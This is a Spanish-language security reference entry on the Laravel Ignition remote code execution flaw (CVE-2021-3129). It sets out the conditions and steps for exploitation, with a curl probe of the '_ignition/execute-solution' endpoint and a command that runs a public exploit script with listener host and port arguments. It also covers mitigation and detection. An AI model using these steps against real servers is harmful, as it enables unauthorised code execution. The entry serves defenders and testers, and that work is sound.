---
topic: Laravel Ignition RCE (CVE-2021-3129)
tags: [web, laravel, ignition, cve-2021-3129, php, deserialization]
---

# Laravel Ignition RCE (CVE-2021-3129)

[🇬🇧 English](laravel-ignition-rce.en.md) | **Español**

## Concepto

Laravel con Ignition en modo debug expone `_ignition/execute-solution`. La falta de validación permite escribir un archivo PHAR y deserializarlo, lo que ejecuta código PHP. La explotación requiere `APP_DEBUG=true` y una versión vulnerable de Ignition (< 2.5.2).

## Cuándo aplica

- Laravel con `APP_DEBUG=true`.
- Ignition anterior a 2.5.2.
- El endpoint `_ignition/execute-solution` es accesible.
- El servidor puede escribir en `storage/logs` o similar.

## Requisitos

1. URL de la aplicación.
2. Confirmación de modo debug (página de error detallada).
3. Capacidad de escribir un PHAR y forzar su deserialización.
4. Conocimiento de la ruta del proyecto.

## Procedimiento

Se confirma el endpoint:

```bash
curl -s http://<HOST>/_ignition/execute-solution
```

Se usa un exploit público que:

1. Limpia logs y escribe un payload PHAR.
2. Envía una petición con `solution` y `parameters` para deserializar.
3. Ejecuta comandos mediante un gadget de Laravel.

```bash
python3 CVE-2021-3129.py http://<HOST> <LHOST> <LPORT>
```

## Variantes

- **PHAR deserialization**: el vector clásico.
- **Log poisoning + PHP filter**: variantes de escritura.
- **Ignition 1.x**: endpoints y gadgets distintos.
- **Laravel 8/9**: confirmar versión y dependencias.

## Limitaciones

- Requiere `APP_DEBUG=true`.
- Ignition 2.5.2+ corrige la validación.
- El WAF puede bloquear `_ignition`.
- La ruta de escritura debe ser accesible.

## Mitigación

- Actualizar Ignition a 2.5.2+ y Laravel.
- Desactivar `APP_DEBUG` en producción.
- Bloquear `_ignition` y `execute-solution`.
- Restringir escritura en `storage`.

## Detección

- Peticiones a `_ignition/execute-solution`.
- Errores 500 con trazas detalladas.
- Escrituras anómalas en `storage/logs`.
- Procesos PHP con conexiones salientes.

MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell).

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2021-3129>
- <https://github.com/ambionics/laravel-exploits>
- <https://laravel.com/docs/9.x/errors>
